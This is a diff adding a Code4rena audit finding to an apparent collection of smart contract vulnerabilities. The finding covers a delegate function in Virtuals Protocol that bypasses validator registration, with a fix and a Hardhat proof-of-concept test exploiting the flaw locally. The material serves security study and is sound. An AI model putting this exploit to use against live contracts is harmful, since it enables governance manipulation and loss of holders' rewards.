@@ -1400,3 +1400,95 @@ function createStrategyVault(
 ```
 
 </details>
+
+## 27. [Medium] VotesUpgradeable::delegate bypasses the addValidator call, leads to a non-validator holding voting power along with loss of rewards
+
+### Delegate function bypasses validator registration
+
+- Summary: The bug in VotesUpgradeable::delegate allows users to delegate their voting power to addresses that are not registered validators, because this function bypasses the crucial addValidator call present in AgentVeToken::stake. This loophole breaks the governance system’s integrity by letting non-validators participate in voting without earning rewards, causing both loss of rightful rewards and potential governance manipulation.
+
+- Impact & Recommendation: The recommended fix is to override the delegate function to ensure that every delegatee is properly added as a validator, preserving the system’s consistency and reward distribution.
+
+<br> 🐬: [Source](https://code4rena.com/reports/2025-04-virtuals-protocol#m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards) & [Report](https://code4rena.com/reports/2025-04-virtuals-protocol)
+
+<details><summary>POC</summary>
+
+```javascript
+
+it("Delegate a non-validator", async function () {
+    // Need to provide LP first
+    const { agent, agentNft, virtualToken } = await loadFixture(
+      deployWithAgent
+    );
+    const { trader, poorMan, founder, randomAddr } = await getAccounts();
+    const router = await ethers.getContractAt(
+      "IUniswapV2Router02",
+      process.env.UNISWAP_ROUTER
+    );
+    const agentToken = await ethers.getContractAt("AgentToken", agent.token);
+
+    // Buy tokens
+    const amountToBuy = parseEther("10000000");
+    const capital = parseEther("200000000");
+    await virtualToken.mint(trader.address, capital);
+    await virtualToken
+      .connect(trader)
+      .approve(process.env.UNISWAP_ROUTER, capital);
+
+    await router
+      .connect(trader)
+      .swapTokensForExactTokens(
+        amountToBuy,
+        capital,
+        [virtualToken.target, agent.token],
+        trader.address,
+        Math.floor(new Date().getTime() / 1000 + 600000)
+      );
+    ////
+    // Start providing liquidity
+    const lpToken = await ethers.getContractAt("ERC20", agent.lp);
+    const veToken = await ethers.getContractAt("AgentVeToken", agent.veToken);
+    await veToken.connect(founder).setCanStake(true);
+    expect(await lpToken.balanceOf(trader.address)).to.be.equal(0n);
+    await agentToken
+      .connect(trader)
+      .approve(process.env.UNISWAP_ROUTER, parseEther("10000000"));
+    await virtualToken
+      .connect(trader)
+      .approve(process.env.UNISWAP_ROUTER, parseEther("10000000"));
+
+    await router
+      .connect(trader)
+      .addLiquidity(
+        agentToken.target,
+        virtualToken.target,
+        await agentToken.balanceOf(trader.address),
+        await virtualToken.balanceOf(trader.address),
+        0,
+        0,
+        trader.address,
+        Math.floor(new Date().getTime() / 1000 + 6000)
+      );
+    /////////////////
+    // Staking, and able to delegate to anyone
+    await lpToken.connect(trader).approve(agent.veToken, parseEther("100"));
+    await expect(
+      veToken
+        .connect(trader)
+        .stake(parseEther("10"), trader.address, poorMan.address)
+    ).to.be.not.reverted;
+
+    // Delegate to someone else without adding to the addValidator
+    await veToken.connect(trader).delegate(randomAddr);
+
+    // Assert poorMan as a validator
+    expect(await agentNft.isValidator(agent.virtualId , poorMan.address)).to.be.eq(true);
+    // Assert RandomAddress as not a validator
+    expect(await agentNft.isValidator(agent.virtualId , randomAddr.address)).to.be.eq(false);
+
+  });
+
+});
+```
+
+</details>
